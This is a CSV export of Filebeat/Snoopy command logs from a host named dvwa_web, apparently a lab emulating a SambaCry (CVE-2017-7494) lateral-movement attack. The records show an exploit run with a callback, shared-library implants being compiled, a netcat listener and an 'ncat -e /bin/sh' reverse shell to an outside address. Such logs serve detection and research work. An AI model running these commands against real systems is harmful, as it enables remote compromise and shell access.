"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version",command,cwd,"ecs.version","event.dataset","event.ingested",filename,"host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,sid,tty,uid
"Oct 24, 2022 @ 23:29:17.029","aN-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","uname -rs","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/bin/uname","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","658,672","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/bin/uname]: uname -rs",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","ad-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","uname -p","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/bin/uname","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","658,774","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/bin/uname]: uname -p",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","at-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","python2.7 setup.py install","/exploits/Lateral_Movement_T1210/impacket","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/exploits/Lateral_Movement_T1210/venv/bin/python2.7","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","658,875","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210/impacket filename:/exploits/Lateral_Movement_T1210/venv/bin/python2.7]: python2.7 setup.py install",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","a9-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","python2.7 cve_2017_7494.py -t 10.10.10.30 -u sambacry -P nosambanocry --rhost 10.10.10.10 --rport 31337","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/exploits/Lateral_Movement_T1210/venv/bin/python2.7","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","659,044","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/exploits/Lateral_Movement_T1210/venv/bin/python2.7]: python2.7 cve_2017_7494.py -t 10.10.10.30 -u sambacry -P nosambanocry --rhost 10.10.10.10 --rport 31337",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","bN-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","file /exploits/Lateral_Movement_T1210/venv/bin/python","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/exploits/Lateral_Movement_T1210/venv/bin/file","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","659,281","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/exploits/Lateral_Movement_T1210/venv/bin/file]: file /exploits/Lateral_Movement_T1210/venv/bin/python",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","bd-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","file /exploits/Lateral_Movement_T1210/venv/bin/python","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/usr/local/sbin/file","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","659,463","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/local/sbin/file]: file /exploits/Lateral_Movement_T1210/venv/bin/python",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","bt-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","file /exploits/Lateral_Movement_T1210/venv/bin/python","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/usr/local/bin/file","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","659,619","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/local/bin/file]: file /exploits/Lateral_Movement_T1210/venv/bin/python",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","b9-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","file /exploits/Lateral_Movement_T1210/venv/bin/python","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/usr/sbin/file","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","659,774","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/sbin/file]: file /exploits/Lateral_Movement_T1210/venv/bin/python",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","cN-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","file /exploits/Lateral_Movement_T1210/venv/bin/python","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.755","/usr/bin/file","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","659,924","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/bin/file]: file /exploits/Lateral_Movement_T1210/venv/bin/python",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","cd-cCoQBDsc6tFfSywu-",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",make,"/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.766","/usr/bin/make","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","660,073","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/bin/make]: make",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","ct-cCoQBDsc6tFfSywu-",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/lib/gcc/x86_64-linux-gnu/10/cc1 -quiet -imultiarch x86_64-linux-gnu implant.c -quiet -dumpbase implant.c -mtune=generic -march=x86-64 -auxbase implant -Wall -Wno-nonnull -fPIC -fasynchronous-unwind-tables -o /tmp/ccRdKUNX.s","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.766","/usr/lib/gcc/x86_64-linux-gnu/10/cc1","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","660,173","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/lib/gcc/x86_64-linux-gnu/10/cc1]: /usr/lib/gcc/x86_64-linux-gnu/10/cc1 -quiet -imultiarch x86_64-linux-gnu implant.c -quiet -dumpbase implant.c -mtune=generic -march=x86-64 -auxbase implant -Wall -Wno-nonnull -fPIC -fasynchronous-unwind-tables -o /tmp/ccRdKUNX.s",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","c9-cCoQBDsc6tFfSywu-",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/lib/gcc/x86_64-linux-gnu/10/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/10/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/10/lto-wrapper -plugin-opt=-fresolution=/tmp/ccD2ajzX.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -shared -o libimplantx64.so /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/10/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/10 -L/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/10/../../.. /tmp/ccA4uGpV.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/10/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/crtn.o","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.766","/usr/lib/gcc/x86_64-linux-gnu/10/collect2","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","660,520","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/lib/gcc/x86_64-linux-gnu/10/collect2]: /usr/lib/gcc/x86_64-linux-gnu/10/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/10/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/10/lto-wrapper -plugin-opt=-fresolution=/tmp/ccD2ajzX.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -shared -o libimplantx64.so /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/10/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/10 -L/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/10/../../.. /tmp/ccA4uGpV.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/10/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/crtn.o",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","dN-cCoQBDsc6tFfSywu-",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/lib/gcc/x86_64-linux-gnu/10/cc1 -quiet -imultilib 32 -imultiarch i386-linux-gnu implant.c -quiet -dumpbase implant.c -m32 -mtune=generic -march=i686 -auxbase implant -Wall -Wno-nonnull -fPIC -fasynchronous-unwind-tables -o /tmp/ccJ73v0m.s","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.766","/usr/lib/gcc/x86_64-linux-gnu/10/cc1","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","661,719","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/lib/gcc/x86_64-linux-gnu/10/cc1]: /usr/lib/gcc/x86_64-linux-gnu/10/cc1 -quiet -imultilib 32 -imultiarch i386-linux-gnu implant.c -quiet -dumpbase implant.c -m32 -mtune=generic -march=i686 -auxbase implant -Wall -Wno-nonnull -fPIC -fasynchronous-unwind-tables -o /tmp/ccJ73v0m.s",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.029","dd-cCoQBDsc6tFfSywu-",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/lib/gcc/x86_64-linux-gnu/10/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/10/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/10/lto-wrapper -plugin-opt=-fresolution=/tmp/ccdat2Wm.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_i386 --hash-style=gnu --as-needed -shared -o libimplantx32.so /usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib32/crti.o /usr/lib/gcc/x86_64-linux-gnu/10/32/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/10/32 -L/usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib32 -L/lib/../lib32 -L/usr/lib/../lib32 -L/usr/lib/gcc/x86_64-linux-gnu/10 -L/usr/lib/gcc/x86_64-linux-gnu/10/../../.. /tmp/ccdWCHOm.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/10/32/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib32/crtn.o","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.766","/usr/lib/gcc/x86_64-linux-gnu/10/collect2","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","662,081","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/lib/gcc/x86_64-linux-gnu/10/collect2]: /usr/lib/gcc/x86_64-linux-gnu/10/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/10/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/10/lto-wrapper -plugin-opt=-fresolution=/tmp/ccdat2Wm.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_i386 --hash-style=gnu --as-needed -shared -o libimplantx32.so /usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib32/crti.o /usr/lib/gcc/x86_64-linux-gnu/10/32/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/10/32 -L/usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib32 -L/lib/../lib32 -L/usr/lib/../lib32 -L/usr/lib/gcc/x86_64-linux-gnu/10 -L/usr/lib/gcc/x86_64-linux-gnu/10/../../.. /tmp/ccdWCHOm.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/10/32/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/10/../../../../lib32/crtn.o",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.028","Vd-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","git clone https://github.com/opsxcq/impacket.git","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.754","/usr/bin/git","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","656,254","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/usr/bin/git]: git clone https://github.com/opsxcq/impacket.git",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:17.023","VN-cCoQBDsc6tFfSywuj",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","bash start_exploit.sh","/exploits/Lateral_Movement_T1210","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:18.754","/bin/bash","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","656,141","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Lateral_Movement_T1210 filename:/bin/bash]: bash start_exploit.sh",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:29:03.018","MN6cCoQBDsc6tFfSlX-O",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/sbin/exim4 -Mc 1omzNt-0014kc-Ne","/var/spool/exim4","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:04.904","/usr/sbin/exim4","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,940","[uid:105 sid:256595 tty:(none) cwd:/var/spool/exim4 filename:/usr/sbin/exim4]: /usr/sbin/exim4 -Mc 1omzNt-0014kc-Ne",256595,"(none)",105
"Oct 24, 2022 @ 23:29:03.018","Md6cCoQBDsc6tFfSlX-O",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","nc -lnvp 31337","/var/www/html","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:04.904","/bin/nc","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","656,056","[uid:0 sid:256567 tty:/dev/pts/2 cwd:/var/www/html filename:/bin/nc]: nc -lnvp 31337",256567,"/dev/pts/2",0
"Oct 24, 2022 @ 23:29:03.007","L96cCoQBDsc6tFfSlX-O",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","ncat -e /bin/sh 123.123.123.250 9002","/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:04.904","/usr/bin/ncat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,839","[uid:0 sid:256592 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002",256592,"(none)",0
